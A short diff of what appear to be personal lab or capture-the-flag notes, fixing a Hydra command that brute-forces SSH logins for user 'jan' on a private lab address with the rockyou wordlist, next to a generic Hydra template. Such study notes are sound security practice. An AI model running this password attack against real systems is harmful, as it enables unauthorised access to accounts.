@@ -16,7 +16,7 @@ hydra -l [USERNAME] -P [WORDLIST] [METHOD]://10.10.10.10
 
 
 ```
--l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.35.240
+hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.35.240
 ```
 
 ```dataviewjs
